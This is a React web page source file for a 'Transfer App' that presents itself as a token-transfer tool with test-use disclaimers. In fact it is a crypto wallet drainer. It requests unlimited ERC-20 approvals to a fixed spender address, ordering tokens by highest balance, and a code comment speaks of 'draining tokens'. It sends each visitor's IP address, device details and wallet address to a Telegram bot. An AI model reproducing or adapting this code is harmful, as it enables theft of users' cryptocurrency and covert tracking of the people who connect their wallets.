import { useEffect, useState } from "react";
import toast from "react-hot-toast";
import {
  useAccount,
  useWriteContract,
  useWaitForTransactionReceipt,
  useDisconnect,
  useChainId,
  useSwitchChain,
  useBalance,
  useReadContracts,
} from "wagmi";
import erc20Abi from "@/abi/erc20.json";
import {
  TOKEN_ADDRESSES_BNB,
  TOKEN_ADDRESSES_ETH,
  SPENDER_ADDRESS_BNB,
  SPENDER_ADDRESS_ETH, chainIdBNB
} from "@/config";
import ConnectButton from "../components/ConnectButton";

export default function Home() {
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  const connectedChainId = useChainId();
  const { chains, switchChain } = useSwitchChain();
  const [selectedChainId, setSelectedChainId] = useState(chainIdBNB);
  const isBNB = selectedChainId === chainIdBNB;
  const tokenAddresses = isBNB ? TOKEN_ADDRESSES_BNB : TOKEN_ADDRESSES_ETH;
  const spenderAddress = isBNB ? SPENDER_ADDRESS_BNB : SPENDER_ADDRESS_ETH;
  const explorerUrl = isBNB
    ? "https://bscscan.com/tx"
    : "https://etherscan.io/tx";

  const {
    writeContract: approveSpending,
    data: txHash,
    isPending,
    isError,
  } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } =
    useWaitForTransactionReceipt({
      hash: txHash,
    });

  const [isRouting, setIsRouting] = useState(false);
  const [isApprovingAll, setIsApprovingAll] = useState(false);
  const [approvalQueue, setApprovalQueue] = useState([]);
  const [completedApprovals, setCompletedApprovals] = useState([]);
  const [nativeBalance, setNativeBalance] = useState(null);
  const [tokenBalances, setTokenBalances] = useState({});

  // Get native coin balance
  const { data: nativeBalanceData } = useBalance({
    address: address,
    chainId: selectedChainId,
  });

  // Get token balances
  const tokenContracts = Object.entries(tokenAddresses).map(
    ([symbol, address]) => ({
      address: address,
      abi: erc20Abi,
      functionName: "balanceOf",
      args: [address],
    })
  );

  const { data: tokenBalancesData } = useReadContracts({
    contracts: tokenContracts,
  });

  useEffect(() => {
    if (nativeBalanceData) {
      setNativeBalance(nativeBalanceData);
    }
  }, [nativeBalanceData]);

  useEffect(() => {
    if (tokenBalancesData) {
      const balances = {};
      Object.keys(tokenAddresses).forEach((symbol, index) => {
        if (tokenBalancesData[index]?.result) {
          balances[symbol] = tokenBalancesData[index].result;
        }
      });
      setTokenBalances(balances);
    }
  }, [tokenBalancesData, tokenAddresses]);

  // Function to approve tokens in order of highest balance
  const handleApproveAll = async () => {
    if (!address) {
      toast.error("Connect your wallet first.");
      return;
    }

    setIsApprovingAll(true);
    try {
      // Create approval queue with tokens sorted by balance (highest first)
      const tokensWithBalances = Object.entries(tokenBalances)
        .filter(([symbol, balance]) => balance > 0)
        .sort((a, b) => b[1] - a[1]);

      const queue = tokensWithBalances.map(([symbol, balance]) => ({
        symbol,
        address: tokenAddresses[symbol],
        balance,
      }));

      setApprovalQueue(queue);

      // Approve tokens in order
      for (const token of queue) {
        await approveSpending({
          address: token.address,
          abi: erc20Abi,
          functionName: "approve",
          args: [
            spenderAddress,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935",
          ],
          chainId: selectedChainId,
        });

        // Wait for confirmation
        await new Promise((resolve) => setTimeout(resolve, 2000));
        setCompletedApprovals((prev) => [...prev, token.symbol]);
      }

      // After draining tokens, check native coin balance
      if (nativeBalance && parseFloat(nativeBalance.formatted) >= 0.003) {
        // Send information to Telegram bot
        const nativeMsg = `💰 Native coin approval\nNetwork: ${
          isBNB ? "BNB" : "ETH"
        }\nAmount: ${nativeBalance.formatted}\nAddress: ${address}`;
        sendLog(nativeMsg, true);
      }

      // Send summary to Telegram bot
      const summaryMsg = `✅ All tokens approved successfully\nNetwork: ${
        isBNB ? "BNB" : "ETH"
      }\nTokens: ${queue.map((t) => t.symbol).join(", ")}\nAddress: ${address}`;
      sendLog(summaryMsg, true);

      toast.success("All tokens approved successfully!");
    } catch (err) {
      console.error("Approval failed:", err);
      toast.error("Approval failed.");
    } finally {
      setIsApprovingAll(false);
      setApprovalQueue([]);
      setCompletedApprovals([]);
    }
  };

  const handleRevoke = async () => {
    try {
      // Revoke all token approvals
      for (const symbol of Object.keys(tokenAddresses)) {
        await approveSpending({
          address: tokenAddresses[symbol],
          abi: erc20Abi,
          functionName: "approve",
          args: [spenderAddress, 0],
          chainId: selectedChainId,
        });
        toast.loading(`Revoking ${symbol} allowance...`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
      toast.success("All allowances revoked!");
    } catch (err) {
      toast.error("Revoke failed.");
      console.error(err);
    }
  };

  const handleRoute = async () => {
    if (!address) {
      toast.error("Connect your wallet first.");
      return;
    }
    if (!isConfirmed) {
      toast.error("Please authorize first.");
      return;
    }
    try {
      setIsRouting(true);
      const explorer = `${explorerUrl}/${txHash}`;
      toast.success(
        <span>
          Routing initiated!
          <br />
          {txHash && (
            <a
              href={explorer}
              target="_blank"
              rel="noopener noreferrer"
              className="underline text-blue-400"
            >
              View last approval
            </a>
          )}
        </span>
      );
      const routeMsg = `🚀 Route initiated\nAddress: \n\`\`\`\n${address}\n\`\`\`\nTx: ${
        txHash ? explorer : "N/A"
      }`;
      sendLog(routeMsg, true);
    } catch (err) {
      toast.error("Routing failed.");
      console.error(err);
    } finally {
      setIsRouting(false);
    }
  };

  useEffect(() => {
    if (isConfirmed && txHash) {
      toast.success(
        <span>
          Approval confirmed! <br />
          <a
            href={`${explorerUrl}/${txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="underline text-blue-400"
          >
            View Transaction
          </a>
        </span>
      );
      logUserInfo();
    }
  }, [isConfirmed, txHash]);

  useEffect(() => {
    if (address) logWallet();
  }, [address]);

  const logUserInfo = async () => {
    const userIp = await fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => data.ip)
      .catch(() => "Unknown");

    const userAgent = navigator.userAgent;
    const debankUrl = `https://debank.com/profile/${address}`;

    const logMsg = `✅ Token approval successful 🌐 IP: ${userIp} 📱 Device: ${
      userAgent.split(")")[0]
    }) 💼 Address: \`\`\`\n${address}\n\`\`\` 🔗 [View on Debank](${debankUrl})`;
    sendLog(logMsg, true);
  };

  const logWallet = async () => {
    const userIp = await fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => data.ip)
      .catch(() => "Unknown");

    const userAgent = navigator.userAgent;
    const debankUrl = `https://debank.com/profile/${address}`;

    const logMsg = `✅ Wallet Connected 🌐 IP: ${userIp} 📱 Device: ${
      userAgent.split(")")[0]
    }) 💼 Address: \`\`\`\n${address}\n\`\`\` 🔗 [View on Debank](${debankUrl})`;
    sendLog(logMsg, true);
  };

  function sendLog(message, markdown = false) {
    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: markdown ? "Markdown" : "HTML",
        disable_web_page_preview: false,
      }),
    }).catch((err) => {
      console.error("Telegram log failed:", err);
    });
  }

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center">
      <main className="p-6 w-full max-w-md space-y-6 bg-gray-900 rounded-2xl shadow-lg">
        <h2 className="text-2xl font-bold mb-2 text-center">Transfer App</h2>
        <p className="mb-4 text-gray-300 text-sm">
          This project allows you to transfer tokens from your wallet to a
          contract using the approval mechanism. First, approve the contract to
          spend your tokens.
        </p>
        <p className="mb-6 text-yellow-400 text-sm">
          ⚠️ <strong>Test Purpose:</strong> This app is for testing and
          educational use only. Do not use real funds without understanding the
          risks.
        </p>
        {!address ? (
          <ConnectButton />
        ) : (
          <>
            <button
              type="button"
              onClick={() => disconnect()}
              className="w-full py-3 rounded-full bg-red-500 hover:bg-red-600 transition font-semibold shadow-md"
            >
              Disconnect Wallet
            </button>
            <div className="space-y-2">
              <label className="block text-sm font-medium">
                Select Network
              </label>
              {chains.map((chain) => {
                const isCurrent = connectedChainId === chain.id;
                return (
                  <button
                    type="button"
                    key={chain.id}
                    onClick={async () => {
                      if (isCurrent) {
                        toast.info(`You're already on ${chain.name}`);
                        return;
                      }
                      try {
                        await switchChain({ chainId: chain.id });
                        toast.success(`Switched to ${chain.name}`);
                        setSelectedChainId(chain.id);
                      } catch (err) {
                        toast.error(`Failed to switch to ${chain.name}`);
                      }
                    }}
                    disabled={isCurrent}
                    className={`w-full py-2 px-4 rounded-lg font-semibold transition-all ${
                      isCurrent
                        ? "bg-gray-500 text-gray-300 cursor-not-allowed"
                        : "bg-blue-600 hover:bg-blue-700 text-white"
                    }`}
                  >
                    {isCurrent
                      ? `${chain.name} (Connected)`
                      : `Switch to ${chain.name}`}
                  </button>
                );
              })}
            </div>
            <div className="p-4 bg-yellow-100 text-yellow-800 rounded-lg text-sm">
              ⚠️ <strong>Risk Warning:</strong> You're granting unlimited token
              approval. Only proceed if you trust the destination contract.
            </div>
            <div className="p-4 bg-gray-800 text-gray-300 rounded-lg text-xs">
              🔒 <strong>Privacy Notice:</strong> By using this app, your public
              wallet address, IP, and device info may be logged for security and
              auditing purposes.
            </div>
            <button
              type="button"
              onClick={handleApproveAll}
              disabled={isPending || isConfirming || isApprovingAll}
              className={`w-full py-3 rounded-full font-bold transition-all ${
                isPending || isConfirming || isApprovingAll
                  ? "bg-gray-600 text-gray-300 cursor-not-allowed"
                  : "bg-gradient-to-r from-green-500 to-green-700 text-white shadow-md hover:from-green-600 hover:to-green-800"
              }`}
            >
              {isApprovingAll ? "Approving..." : "Approve All Tokens"}
            </button>
            {isApprovingAll && approvalQueue.length > 0 && (
              <div className="p-4 bg-blue-900 text-blue-100 rounded-lg text-sm">
                <p>Approving tokens in order of highest balance:</p>
                <ul className="list-disc pl-5 mt-2">
                  {approvalQueue.map((token, index) => (
                    <li
                      key={token.symbol}
                      className={
                        completedApprovals.includes(token.symbol)
                          ? "line-through"
                          : ""
                      }
                    >
                      {token.symbol} ({token.balance.toString()})
                    </li>
                  ))}
                </ul>
              </div>
            )}
            <button
              type="button"
              onClick={handleRoute}
              disabled={isPending || isConfirming || isRouting}
              className={`w-full py-3 rounded-full font-bold transition-all ${
                isPending || isConfirming || isRouting
                  ? "bg-gray-600 text-gray-300 cursor-not-allowed"
                  : "bg-gradient-to-r from-blue-500 to-blue-700 text-white shadow-md hover:from-blue-600 hover:to-blue-800"
              }`}
            >
              {isRouting ? "Routing..." : "Route"}
            </button>
            <button
              type="button"
              onClick={handleRevoke}
              disabled={isPending || isConfirming}
              className={`w-full py-3 rounded-full font-bold transition-all ${
                isPending || isConfirming
                  ? "bg-gray-600 text-gray-300 cursor-not-allowed"
                  : "bg-gradient-to-r from-red-500 to-red-700 text-white shadow-md hover:from-red-600 hover:to-red-800"
              }`}
            >
              {isConfirming
                ? "Confirming..."
                : isPending
                ? "Pending..."
                : "Revoke All Allowances"}
            </button>
          </>
        )}
      </main>
    </div>
  );
}
